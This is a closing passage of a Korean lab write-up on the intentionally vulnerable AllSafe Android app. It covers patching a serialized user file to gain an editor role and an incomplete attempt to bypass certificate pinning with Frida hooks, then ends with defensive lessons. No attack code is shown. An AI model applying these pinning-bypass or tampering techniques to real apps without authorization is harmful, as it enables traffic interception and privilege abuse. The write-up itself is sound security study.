필요합니다. FUSE 소유권 때문에 삽질한 덕에, 파일을 덮어쓰는 거랑 제자리에서 고치는 게 시스템
관점에서 얼마나 다른지도 덤으로 배웠습니다.

![Object Serialization — user.dat 의 role 을 ROLE_EDITOR 로 제자리 패치하자 "Good job!" 과 역직렬화된 객체가 그대로 표시됩니다](/assets/img/allsafe-android/c18-object-serialization.png)

---

## 7. 인증서 피닝

마지막은 솔직하게 선을 그어야 하는 문제였습니다. Certificate Pinning 모듈은 OkHttp `CertificatePinner`로
`httpbin.io`를 피닝합니다. 코드를 읽어 보니 구현이 자가 치유형이라 흥미로웠습니다. 먼저 일부러 틀린
핀으로 요청해서 예외 메시지에서 실제 서버 핀 해시를 파싱한 뒤, 그 해시로 다시 피닝합니다. 그래서
앱은 정상 상황에서 항상 연결에 성공합니다.

```
D ALLSAFE : sha256/G+QSw0qJuwUD7UqjInOR+MY5s8BVHgu1BuxjH6UvFx8=   # 실서버 핀을 스스로 재유도
Snackbar: Successful connection over HTTPS!
```

저도 Frida로 `CertificatePinner.check` / `check$okhttp`를 무력화하는 훅을 넣어 봤지만, 여기선 솔직하게
적겠습니다. 피닝 우회의 진짜 목적은 가로채기 프록시(Burp/mitmproxy)의 CA를 앱이 받아들이게 만드는
겁니다. 프록시를 안 세운 이 환경에서는 핀 검증을 건너뛰게 만든 것까지는 계측으로 보였지만,
클리어텍스트 트래픽을 실제로 가로채 보여 주는 단계는 프록시랑 CA 설치가 있어야 합니다. 게다가 릴리스
R8 빌드라 내부 핀검증 호출 경로가 훅 시그니처랑 어긋나는 부분도 있었습니다. 그래서 이 모듈만큼은
분석·기법·연결 성공 확인까지로 정직하게 남기고, 트래픽 가로채기는 프록시 셋업을 전제로 다음에 따로
검증할 지점으로 표시해 둡니다.

![Certificate Pinning — 자가 치유 피너가 실서버 핀을 재유도해 HTTPS 연결에 성공합니다](/assets/img/allsafe-android/c06-certificate-pinning.png)

---

## 마치며

전부 풀고 나니 결국 한 문장으로 정리되더라고요. 기기 안에 있는 건 뭐든 비밀이 아니고, 밖에서
들어오는 건 뭐든 믿을 수 없다는 겁니다. 로그·prefs·리소스·dex·네이티브 문자열은 전부 뽑혔고,
클라이언트 판정(PIN·루트·네이티브·방화벽)은 정적 추출이나 동적 후킹으로 뒤집혔고, exported 컴포넌트랑
검증 없는 입력(SQL·WebView·직렬화·패키지 컨텍스트)은 그대로 공격 표면이 됐습니다.

그런데 풀면서 개인적으로 제일 많이 남은 건 되는 것보다 안 되는 것의 경계였습니다. scoped storage는
`/sdcard` 기반 dex 로딩 벡터를 실제로 죽였고, 요금제 정책이 바뀌면서 Firebase Storage 백엔드는
회수됐고, RootBeer는 제 깨끗한 AVD를 루팅으로 잡지도 않았습니다. 취약점이 코드에 그대로 있어도
플랫폼이랑 환경이 도달성을 바꾼다는 걸 계속 마주쳤습니다. 그래서 앞으로도 코드에 있다는 거랑 지금 이
기기에서 진짜 터진다는 걸 구분해서 적으려고 합니다. 이 앱이 저한테 준 제일 큰 습관인 것 같습니다.

방어 쪽도 결국 같은 얘기입니다. 비밀은 서버나 Keystore로, 판정은 서버로, 컴포넌트는 기본 닫힘으로,
입력은 파라미터 바인딩이나 화이트리스트로, 믿을 수 없는 코드·데이터·컨텍스트는 로드하지 않기.
하나하나는 교과서에 다 나오는 얘기인데, 이 앱은 그 교과서를 어겼을 때 실제로 뭐가 터지는지를 화면이랑
로그로 직접 보여 줘서 훨씬 잘 남았습니다.

솔직히 처음엔 그냥 문제 하나 풀어볼까 하고 가볍게 시작했는데, 하다 보니 삽질하는 것도 재밌고 "이건
왜 안 되지?" 하고 파고드는 순간이 제일 기억에 남았습니다. 안드로이드 쪽은 아직 볼 게 많아서 더
공부해 보고 싶습니다. 다음엔 여기서 못 끝낸 인증서 피닝을 프록시까지 세워서 트래픽 가로채기까지 가
볼 생각입니다. 긴 글 여기까지 읽어 주셔서 감사합니다.
